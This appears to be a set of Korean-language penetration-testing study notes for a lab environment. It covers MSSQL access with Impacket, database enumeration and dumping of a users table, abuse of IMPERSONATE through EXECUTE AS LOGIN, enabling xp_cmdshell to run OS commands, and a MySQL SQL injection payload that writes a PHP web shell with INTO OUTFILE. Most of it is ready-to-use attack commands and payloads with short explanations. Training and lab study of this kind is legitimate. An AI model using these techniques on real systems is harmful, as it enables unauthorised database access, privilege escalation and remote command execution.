# 🗂 MSSQL Client Connection

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
→ **Impacket**의 `mssqlclient.py`를 사용하여 MSSQL 서버에 접속.  
→ `-windows-auth` 옵션은 **Windows 인증**을 사용하여 로그인.

```sql
SELECT @@version;
```
→ MSSQL 서버 버전 확인

```sql
enum_db
```
→ enumeration DB

```sql
SELECT * FROM offsec.information_schema.tables;
```
→ 데이터베이스 `offsec`의 모든 테이블 목록 확인

```sql
SELECT * FROM offsec.dbo.users;
```
→ 데이터베이스 `offsec`의 `users` 테이블 내용 조회

---
# SQL Server - IMPERSONATE 권한 확인
```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'hrappdb-reader'
```
1. **`sys.server_permissions`**
   - SQL Server의 서버 수준 권한 정보를 담고 있는 시스템 뷰입니다.
   - `permission_name` 컬럼에 어떤 권한이 부여됐는지 표시됩니다.

2. **`sys.server_principals`**
   - 서버 수준에서 정의된 보안 주체(Principal) 정보를 담고 있는 뷰입니다.
   - 로그인 계정, Windows 로그인, SQL 로그인, 서버 역할 등이 포함됩니다.

3. **JOIN 조건**
   ```sql
   ON a.grantor_principal_id = b.principal_id
   ```
   - 권한을 부여한 **Grantor(부여자)** 의 ID를 보안 주체와 매칭합니다.
   - 즉, 누가 이 권한을 부여했는지를 확인할 수 있습니다.

4. **WHERE 조건**
   ```sql
   WHERE a.permission_name = 'IMPERSONATE'
   ```
   - `IMPERSONATE` 권한만 필터링합니다.
   - 이는 다른 계정으로 가장할 수 있는 권한을 의미합니다.
---
# 💻 MSSQL Code Execution

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
→ 서버 접속 후, **xp_cmdshell** 기능을 활성화하여 시스템 명령어 실행

```sql
-- 1️⃣ 고급 옵션 보기 허용
EXECUTE sp_configure 'show advanced options', 1;
```
> MSSQL의 `sp_configure`는 서버 설정 값을 변경하는 명령입니다.  
> `'show advanced options'` 값을 1로 설정하면, 기본적으로 숨겨져 있는 고급 설정 옵션(예: xp_cmdshell)을 볼 수 있게 됩니다.

```sql
-- 2️⃣ 설정 적용
RECONFIGURE;
```
> 변경한 설정을 즉시 적용합니다.  
> `sp_configure`로 값을 바꾸더라도 `RECONFIGURE`를 실행하지 않으면 실제 적용되지 않습니다.

```sql
-- 3️⃣ xp_cmdshell 기능 활성화
EXECUTE sp_configure 'xp_cmdshell', 1;
```
> `xp_cmdshell`은 SQL 쿼리에서 직접 OS 명령어를 실행하게 해주는 확장 저장 프로시저입니다.  
> 기본적으로 보안상 이유로 비활성화(0) 되어 있습니다.  
> 여기서 1로 설정하여 기능을 켭니다.

```sql
-- 4️⃣ 설정 적용
RECONFIGURE;
```
> 마찬가지로 변경한 `xp_cmdshell` 설정을 즉시 적용합니다.

```sql
-- 5️⃣ OS 명령어 실행
EXECUTE xp_cmdshell 'whoami';
```
> `xp_cmdshell`을 사용해 OS 명령어(`whoami`)를 실행합니다.  
> 결과로 현재 SQL 서버 프로세스가 실행 중인 **Windows 계정**이 출력됩니다.

---


# 🐬 MySQL Code Execution
```sql
' UNION SELECT sleep(5);-- -
```
→ URL ENCODED로 실행해보기

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
→ SQL 인젝션을 통해 PHP 웹셸 생성  
→ `INTO OUTFILE`을 사용하여 지정 경로(`/var/www/html/tmp/webshell.php`)에 파일 작성  
→ 생성된 파일에 접근 후, `cmd` 파라미터를 통해 명령어 실행 가능  
→ 예: `http://target/tmp/webshell.php?cmd=id`

---
